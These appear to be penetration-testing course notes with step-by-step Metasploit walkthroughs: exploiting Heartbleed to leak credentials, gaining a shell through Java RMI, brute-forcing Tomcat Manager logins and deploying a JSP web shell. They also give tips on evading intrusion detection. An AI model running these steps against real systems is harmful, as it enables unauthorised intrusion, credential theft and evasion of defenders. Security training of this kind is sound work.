{% embed url="https://github.com/maurosoria/dirsearch" %}

{% embed url="https://nmap.org/nsedoc/scripts/http-shellshock.html" %}

{% embed url="https://en.wikipedia.org/wiki/Shellshock\_\(software\_bug\)" %}

### Exploiting Heartbleed - Study Guide

Heartbleed, which surfaced in 2014, was a critical bug affecting OpenSSL versions 1.0.1 through 1.0.1f and allowed for the reading of encrypted data stored in memory due to a faulty implementation of the TLS \(Transport Layer Security\) and DTLS \(Datagram Transport Layer Security\) protocols' heartbeat extension \(RFC6520\).

In addition to the "dumping" of arbitrary encrypted data from a server, which could include anything from credentials for the application and any other sensitive data that might reside in memory at any given moment, it also allowed for the dumping of the Private Key responsible for securing that data over SSL.

Having this information would allow an attacker to intercept all SSL traffic to and from the affected server, among other things.

There are several tools in circulation which allow for the exploitation of affected OpenSSL implementation. We'll do a walkthrough with the exploit modules included within the Metasploit Framework.

First we need to identify a vulnerable OpenSSL implementation; this can either be done with `nmap` or Metasploit. `nmap` contains an NSE script `ssl-heartbleed.nse` which can be used to confirm our target is vulnerable with the following command line:

```bash
nmap --script ssl-heartbleed <ip_address>
```

Once we have confirmed our target is vulnerable, we can use Metasploit's `openssl_heartbleed` auxiliary scanner module to dump encrypted memory contents:

```bash
msf> use auxiliary/scanner/ssl/openssl_heartbleed
```

In most scenarios, we can stick with the defaults in regard to the module options. However, this particular module contains several Auxiliary actions, which we can see by running the `show actions` command.

`set action DUMP` command along with `RHOST` value, then `run` the exploit. Metasploit will store the results of the "leaked" data to a file in your `~.msf4/loot` directory as a `.bin` file.

We can simply now run the `strings` command against the `.bin` file to see if we were able to leak anything we can use for our purposes:

```bash
~/.msf4/loot$ strings file.bin
```

We can see that we've successfully leaked the username and password for a user of the application.

{% hint style="info" %}
**A note about Heartbleed**

Exploit scripts and modules that are circulating, if you don't get any "leaked" data from your first run of a specific tool, try again. You will find that different contents will appear t different times within the leaked memory segment of an application.
{% endhint %}

{% embed url="https://en.wikipedia.org/wiki/Datagram\_Transport\_Layer\_Security" %}

{% embed url="https://heartbleed.com/" %}

{% embed url="https://datatracker.ietf.org/doc/html/rfc6520" %}

{% embed url="https://en.wikipedia.org/wiki/Transport\_Layer\_Security" %}

{% embed url="https://www.ssl.com/info/" %}

### Exploiting Java RMI Registry - Study Guide

One usually under-appreciated and overlooked class of vulnerabilities consistently found on Penetration Tests are those involving Java API's, particularly, services which offer a way to invoke Java methods remotely, also known as JAVA RMI.

In particular, there exists a vulnerability in default configurations of RMI Registry and RMI Activation Services and affects what is known as "RMI Distributed Garbage Collector" and essentially allows the loading of arbitrary Java classes from an attacker -defined URL.

The Java RMI Registry service is typically found on port 1099 TCP and can be fingerprinted with a `nmap` version `-sV` and on Linux systems is identified by the `GNU Classpath gmiregistry` fingerprint as seen in the scan output below:

```bash
nmap -sT <ip_address> -p 1099 -sV
```

In addition to the `nmap` scan version detection method on the previous slide, there is a Metasploit scanner module for detecting vulnerable RMI Endpoints, in addition to a Metasploit exploit module `exploit/multi/misc/java_rmi_server` which we can use:

```bash
msf > use exploit/multi/misc/java_rmi_server
msf > show options
```

The `SRVHOST` option is by default set to `0.0.0.0` which means it should listen on any network interface and it is recommended to leave that option as is. The `SRVPORT` option can be left at its default unless you're already running a service on TCP 8080, in which case you will encounter an error that the module can't bind to the port. If that occurs, just modify the `SRVPORT` to a port that isn't currently in use on your system.

The `SRVHOST` and `SRVPORT` options are essentially what the module use as a web server that the target will use to download the Java payload from.

For additional IDS or Endpoint Detection evasion \(if required for your specific target\), you may also want to set `SSL` to `true`.

This can help in evading \(some\) on-the-wire heuristics detection solutions. However, most will flag many Metasploit modules' default SSL certificates. Hence the `SSLCert` option which allows you to specify your own custom SSL certificate for the `SRVHOST`.

As a general rule of thumb, in regard to Metasploit modules and exploits, where possible, always configure a custom SSL certificate for your listeners, etc.

This goes a long way in evading Intrusion Detection Systems. Metasploit has been around a long time, and defenders have heavily analyzed the source code, and have written detection capabilities for most modules in their default configurations. Once we've configured our options, we can attempt to exploit the target:

```bash
msf exploit(multi/misc/java_rmi_server) > run -j
```

We can then interact with our session and drop into a shell:

```bash
msf exploit(multi/misc/java_rmi_server) > sessions -i 1
```

Once again, we can upgrade our sehll:

```bash
python -c 'import tty; tty.spawn("/bin/sh")'
```

{% hint style="info" %}
**Important**

The RMI Registry endpoint can sometimes be found listening on non-standard ports, and other ports which the service may require for other reasons. It's recommended that when assessing a target for this vulnerability, that you run a scan for all 65535 TCP ports in the case that the RMI Registry has been configured to listen on ports other than 1099 TCP.

That goes for virtually any service. 

Administrators often will change default listening ports for many common services, so be sure to conduct comprehensive port scans against your chose targets.
{% endhint %}

{% embed url="https://web.archive.org/web/20190127220546/http:/java.sys-con.com/node/35865" %}

{% embed url="https://en.wikipedia.org/wiki/Java\_remote\_method\_invocation" %}

{% embed url="https://www.rapid7.com/db/modules/exploit/multi/misc/java\_rmi\_server/" %}

### Exploiting Java Deserialization - Study Guide

One particular class of vulnerabilities fall under the domain of "Java Deserialization of untrusted data". This is one of the most "unspoken" vulnerabilities, however they appear to exist in many various applications and the range of affected systems is likely very high, with recent research showing popular Java-based applications Jboss, WebLogic, WebSphere and Jenkins to name a few, are affected by this class of vulnerability.

To explain it simply, serialization itself is a process which allows for applications to convert data into a binary format, which is suitable for saving to disk.

This process is vulnerable to the deserialization of untrusted "malicious" data, which can be supplied by the user, and is ultimately de-serialized by an application resulting in code execution without even requiring authentication in most cases.

If you'd like to experiment in a test environment with Java Deserialization vulnerabilities you can find a great post on how to create small and vulnerable environment at the following link:

{% embed url="https://web.archive.org/web/20160513025134/http:/www.zonksec.com/blog/hands-on-with-weblogic-serialization-vulnerability" %}

#### References

{% embed url="https://owasp.org/www-community/vulnerabilities/Deserialization\_of\_untrusted\_data" %}

{% embed url="https://web.archive.org/web/20160513025134/http:/www.zonksec.com/blog/hands-on-with-weblogic-serialization-vulnerability" %}

{% embed url="https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/" %}

### Exploiting Tomcat - Study Guide

Apache Tomcat is widely used, free and open source web server used primarily for Java-based web applications. One of the primary issues we encounter on engagements is the use of default or weak credentials for administrative interfaces for any number of appliances, web server applications, etc.

Tomcat has been known in the past to ship with default credentials, and often, System Administrators will leave them be for ease-of-use, forget about changing the defaults, or whatever the case may be.

In regard to real-world experience, we find that Apache Tomcat is encountered on most engagements at a very high frequency, as there is also a Microsoft Windows version available as well, making it the primary go-to for in-house Java-based web application server.

Tomcat is known to contain an area within its administrative interface known as the "Tomcat Manager", which is an area of the web application that allows administrators to view settings for internal Tomcat configuration, system statistics quickly and most importantly for our purposes, a method to easily deploy Java applications.

Determining if an Apache Tomcat server is using default credentials, can be as easy as simply browsing to its web interface \(typically found on port 8180 TCP\), and trying some of the known defaults manually. Services can be configured on whatever port the administrator desires, so always make sure to scan non-standard ports for common applications.

As Penetration Testers, the more efficiently we can conduct and automate certain tasks, the more time we have for exploitation and writing reports. 

Metasploit includes an excellent utility for conducting password guessing attacks against Apache Tomcat servers, the "Tomcat Application Manager Login Utility". You can load it from the following location via the Mestasploit console:

```bash
msf > use auxiliary/scanner/http/tomcat_mgr_login
```

For this Manager Login Module, we can \(most of the times\), stay with the defaults and successfully crack the login assuming it's being left with its default credentials, which is quite frequently. Once we set our `RHOSTS` , `RPORT` and `STOP_ON_SUCCESS` options to `true` we can then run the scanner module. Metasploit will use its built-in dictionaries to check for default credentials.

Once we have some valid credentials for the Tomcat Manager, we can explore our options in regards to exploiting this access, and to ultimately, control of the system. 

{% hint style="info" %}
**Note**

Experiment with the Tomcat Manager Login utility in regard to using different username list, password dictionaries, etc. Don't hesitate to use those same techniques in the case that a target application or appliance isn't left configured with default credentials.
{% endhint %}

Once we have access to the Tomcat Manager area of the web server, we can see some already deployed applications. We also have a couple of different options available to us in regard to deploying our own Java application.

The quickest way to exploit this scenario is to use some tools that are already available to us. You can download **Laudanum** or find it on your Kali Linux in the `/usr/share/laudanum` directory. Within the `jsp` directory we can already see a pre-compiled `cmd.war` application that should be ready for use.

The `cmd.war` application is essentially a java application, which if we can deploy successfully, will allow control of the server and remote command execution. Uploading and deploying the war file to the application is straight-forward, and only requires we browse to the Laudanum `cmd.war` file and upload it. Once we click the 'Deploy' button confirm the application is available in the upper section of the Manager Interface.

If the application deployed correctly, we can browse to it with the following URL: `http://<ip_address>:8180/cmd/cmd.jsp`. This will allow us to execute commands on the system fro the JSP Shell. From here forward, there are multiple ways we can obtain a reverse shell from this system. 

{% embed url="https://tomcat.apache.org/" %}

{% embed url="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown" %}

{% embed url="https://en.wikipedia.org/wiki/Free\_and\_open-source\_software" %}

{% embed url="https://sourceforge.net/projects/laudanum/" %}

{% embed url="https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat\_mgr\_login/" %}

{% embed url="https://tomcat.apache.org/download-70.cgi" %}

### ‚ñ∂ Remote Exploitation

## Post Exploitation

### Post Exploitation Introduction - Study Guide

### Privilege Escalation - Study Guide

### Lateral Movement - Study Guide

### Data Exfiltration - Study Guide

### Maintaining Access - Study Guide

### ‚ñ∂ Post-Exploitation and Lateral Movement

### üß™ Linux Exploitation: Lab 3 - Remote Exploitation and Post Exploitation

### üß™ Linux Exploitation: Lab 4 - Lateral Movement

